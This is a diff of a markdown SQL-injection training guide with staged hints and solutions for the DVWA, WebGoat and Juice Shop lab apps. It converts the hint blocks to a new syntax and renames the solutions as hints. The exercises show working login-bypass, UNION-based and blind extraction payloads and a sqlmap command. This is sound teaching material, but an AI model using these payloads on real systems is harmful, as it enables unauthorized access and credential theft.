@@ -100,16 +100,12 @@ Using UNION to combine results from multiple queries.
 **Setup**: Start DVWA and navigate to SQL Injection page  
 **Goal**: Login without knowing the password
 
-<details>
-<summary>💡 Hint 1: Where to start?</summary>
-
+:::hint 💡 Hint 1: Where to start?
 Look at the login form. You have two input fields: username and password. Think about how these might be used in an SQL query.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: What SQL query might be running?</summary>
-
+:::hint 💡 Hint 2: What SQL query might be running?
 The backend probably uses something like:
 ```sql
 SELECT * FROM users WHERE user='[username]' AND password='[password]'
@@ -117,18 +113,14 @@ SELECT * FROM users WHERE user='[username]' AND password='[password]'
 
 How can you manipulate this?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Breaking the query</summary>
-
+:::hint 💡 Hint 3: Breaking the query
 Try using a single quote `'` in the username field. What happens? This might tell you if the input is vulnerable.
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 Enter in the username field:
 ```
 admin' --
@@ -148,7 +140,7 @@ admin' or '1'='1
 SELECT * FROM users WHERE user='admin' --' AND password='whatever'
 ```
 
-</details>
+:::
 
 ---
 
@@ -156,16 +148,12 @@ SELECT * FROM users WHERE user='admin' --' AND password='whatever'
 
 **Goal**: Extract all usernames from the database
 
-<details>
-<summary>💡 Hint 1: Understanding the output</summary>
-
+:::hint 💡 Hint 1: Understanding the output
 First, enter a normal ID like `1`. See how the data is displayed? You'll need to understand the number of columns being returned.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Finding column count</summary>
-
+:::hint 💡 Hint 2: Finding column count
 Try using ORDER BY to find the number of columns:
 ```
 1' ORDER BY 1--
@@ -175,11 +163,9 @@ Try using ORDER BY to find the number of columns:
 
 Keep increasing until you get an error.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Using UNION</summary>
-
+:::hint 💡 Hint 3: Using UNION
 Once you know the column count, you can use UNION SELECT. If there are 2 columns:
 ```
 1' UNION SELECT null, null--
@@ -187,11 +173,9 @@ Once you know the column count, you can use UNION SELECT. If there are 2 columns
 
 Then replace nulls with data you want to extract.
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1**: Find column count
 ```
 1' ORDER BY 3--
@@ -213,7 +197,7 @@ Then replace nulls with data you want to extract.
 1' UNION SELECT user, password FROM users--
 ```
 
-</details>
+:::
 
 ---
 
@@ -221,9 +205,7 @@ Then replace nulls with data you want to extract.
 
 **Goal**: Extract the password for user 'tom' without seeing direct output
 
-<details>
-<summary>💡 Hint 1: Boolean-based approach</summary>
-
+:::hint 💡 Hint 1: Boolean-based approach
 You can ask yes/no questions. Try:
 ```
 tom' AND '1'='1
@@ -232,21 +214,17 @@ tom' AND '1'='2
 
 Do you see different responses?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Extracting one character at a time</summary>
-
+:::hint 💡 Hint 2: Extracting one character at a time
 You can check if the first character of the password is 'a':
 ```
 tom' AND SUBSTRING(password,1,1)='a
 ```
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Automating with ASCII</summary>
-
+:::hint 💡 Hint 3: Automating with ASCII
 Instead of guessing each letter, use ASCII values:
 ```
 tom' AND ASCII(SUBSTRING(password,1,1))>65
@@ -254,11 +232,9 @@ tom' AND ASCII(SUBSTRING(password,1,1))>65
 
 This is a binary search approach!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Manual approach**:
 ```python
 # For each position in the password
@@ -274,7 +250,7 @@ for position in range(1, 20):
 sqlmap -u "http://localhost:8082/WebGoat/SqlInjection/challenge" --cookie="JSESSIONID=..." --data="username_reg=tom&email_reg=*&password_reg=test&confirm_password_reg=test" -p email_reg --technique=B --string="already exists"
 ```
 
-</details>
+:::
 
 ---
 
@@ -283,19 +259,15 @@ sqlmap -u "http://localhost:8082/WebGoat/SqlInjection/challenge" --cookie="JSESS
 **Application**: Juice Shop  
 **Goal**: Login as the admin and change the price of the "Apple Juice" to $0.01
 
-<details>
-<summary>🎯 Challenge Hints</summary>
-
+:::hint 🎯 Hint 1
 1. Find the login bypass first
 2. Look for the products API endpoint
 3. SQL injection isn't just for login forms!
 4. Check the search functionality
 
-</details>
+:::
 
-<details>
-<summary>🔓 Challenge Solution</summary>
-
+:::hint 🔓 Hint 2
 **Step 1**: Login bypass
 ```
 ' or 1=1--
@@ -312,7 +284,7 @@ apple')) UNION SELECT id,email,password,null,null,null,null,null,null FROM users
 **Step 4**: Update product (requires finding admin functionality)
 This actually requires finding the admin panel, which might involve directory enumeration or checking JavaScript files.
 
-</details>
+:::
 
 ---
 
